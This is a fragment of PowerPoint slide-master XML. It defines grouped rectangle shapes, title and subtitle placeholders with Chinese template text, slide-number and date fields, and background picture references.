            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="1776"/>
              <a:ext cx="98"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6" name="Rectangle 154"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="1920"/>
              <a:ext cx="98"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7" name="Rectangle 155"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="2065"/>
              <a:ext cx="98"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8" name="Rectangle 156"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="2207"/>
              <a:ext cx="98" cy="97"/>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9" name="Rectangle 157"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2976" y="1920"/>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0" name="Rectangle 158"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2976" y="2207"/>
              <a:ext cx="97" cy="97"/>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61" name="Rectangle 159"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="1776"/>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2" name="Rectangle 160"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="1920"/>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3" name="Rectangle 161"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="2065"/>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4" name="Rectangle 162"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3264" y="1776"/>
              <a:ext cx="95"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5" name="Rectangle 163"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3264" y="2065"/>
              <a:ext cx="95"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6" name="Rectangle 164"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1632"/>
              <a:ext cx="95" cy="97"/>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7" name="Rectangle 165"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1776"/>
              <a:ext cx="95"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8" name="Rectangle 166"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1920"/>
              <a:ext cx="95"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9" name="Rectangle 167"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="2065"/>
              <a:ext cx="95"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70" name="Rectangle 168"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3553" y="1632"/>
              <a:ext cx="95" cy="97"/>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71" name="Rectangle 169"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3553" y="1920"/>
              <a:ext cx="95"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72" name="Rectangle 170"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3695" y="1776"/>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73" name="Rectangle 171"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3695" y="1920"/>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74" name="Rectangle 172"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3695" y="2065"/>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75" name="Rectangle 173"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2256" y="2065"/>
              <a:ext cx="95"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76" name="Rectangle 174"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2112" y="2065"/>
              <a:ext cx="97"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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="77" name="Group 175"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486400" y="827088"/>
            <a:ext cx="2667000" cy="1066800"/>
            <a:chOff x="2112" y="1632"/>
            <a:chExt cx="1680" cy="672"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="78" name="Rectangle 176"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="1776"/>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79" name="Rectangle 177"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="206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0" name="Rectangle 178"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="2208"/>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1" name="Rectangle 179"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2544" y="1776"/>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2" name="Rectangle 180"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2544" y="1920"/>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3" name="Rectangle 181"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2544" y="206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4" name="Rectangle 182"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2688" y="1776"/>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5" name="Rectangle 183"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2688" y="206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6" name="Rectangle 184"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2688" y="2208"/>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7" name="Rectangle 185"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="1776"/>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8" name="Rectangle 186"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="1920"/>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9" name="Rectangle 187"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="206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90" name="Rectangle 188"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="2208"/>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91" name="Rectangle 189"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2976" y="192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2" name="Rectangle 190"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2976" y="2208"/>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93" name="Rectangle 191"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="1776"/>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4" name="Rectangle 192"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="192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5" name="Rectangle 193"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="206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6" name="Rectangle 194"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3264" y="1776"/>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7" name="Rectangle 195"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3264" y="206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8" name="Rectangle 196"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1632"/>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9" name="Rectangle 197"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1776"/>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0" name="Rectangle 198"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="192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1" name="Rectangle 199"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="206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2" name="Rectangle 200"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3552" y="1632"/>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3" name="Rectangle 201"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3552" y="192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4" name="Rectangle 202"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3696" y="1776"/>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5" name="Rectangle 203"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3696" y="192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6" name="Rectangle 204"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3696" y="206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7" name="Rectangle 205"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2256" y="206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108" name="Rectangle 206"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2112" y="206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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="AutoShape 207"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="533400" y="2655888"/>
            <a:ext cx="7696200" cy="838200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Rectangle 208"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2057400" y="4256088"/>
            <a:ext cx="533400" cy="5334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111" name="Rectangle 209"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1752600" y="4789488"/>
            <a:ext cx="228600" cy="2286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112" name="Rectangle 210"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1524000" y="4941888"/>
            <a:ext cx="304800" cy="3048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3074" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2732088"/>
            <a:ext cx="6629400" cy="685800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="3600">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>单击此处编辑母版标题样式</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3075" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2819400" y="3494088"/>
            <a:ext cx="5638800" cy="381000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buNone/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>单击此处编辑母版副标题样式</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="6461125"/>
            <a:ext cx="1981200" cy="244475"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="6461125"/>
            <a:ext cx="381000" cy="244475"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{8EDAFEB1-C219-4CA1-8CA8-A823C1158887}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="119" name="图片 118">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D90CED79-1855-DD98-E47D-3A590015EB7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-7352"/>
            <a:ext cx="9144000" cy="6865351"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>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655A080B-5019-4254-B519-7842F631F6FA}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>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3" name="灯片编号占位符 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{BABECFF0-6C30-4421-BFAB-84FB47A0C7A7}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="日期占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3BBC1A20-9A2A-72D3-72EE-CAA3190DEA7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-7351"/>
            <a:ext cx="9144000" cy="5372658"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="271922512"/>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7364667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76709695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49168357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71740187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8523582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841044592"/>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89501403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33121457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515609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42931629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89388339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34987678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59576502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1717551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94563602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06369218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86320510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93190419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9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92308754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4986078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28786001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34538292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507443506"/>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40342392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05574268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11100884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55417730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796419075"/>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9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127023194"/>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886451957"/>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909140211"/>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179949319"/>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671894862"/>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038718037"/>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004795106"/>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58479577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63251787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070225500"/>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9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787514004"/>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4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457133971"/>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837804731"/>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4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702023691"/>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4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88208223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4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037482555"/>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4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50877563"/>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4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60675831"/>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4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819357688"/>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5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207335777"/>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5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628131453"/>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5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809920990"/>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5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58051417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5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648346706"/>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5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175414495"/>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5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453097316"/>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5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96413408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6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648459546"/>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6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308823551"/>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6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68832252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6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232773432"/>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6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572592904"/>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6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064208739"/>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6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427983176"/>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6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73775771"/>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69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873232122"/>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7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188451359"/>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7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167321732"/>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7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005697339"/>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7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63713509"/>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7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63213342"/>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7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0567607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7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836278168"/>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8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950794082"/>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8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059669442"/>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8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778167989"/>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8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9891406"/>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8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983897914"/>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8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931321853"/>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8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173544612"/>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8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792712188"/>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8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192468299"/>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89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027272077"/>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9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464737300"/>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9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115750637"/>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9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428857868"/>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9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885580579"/>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9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041517460"/>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21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876027849"/>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21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829533069"/>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21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414453131"/>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21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424052470"/>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21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04485406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theme" Target="../theme/theme1.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image" Target="../media/image2.png"/><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142" name="Rectangle 118"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="8010525" y="0"/>
            <a:ext cx="1133475" cy="1044575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1143" name="Rectangle 119"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="1044575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1176" name="Rectangle 152"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6553200" y="76200"/>
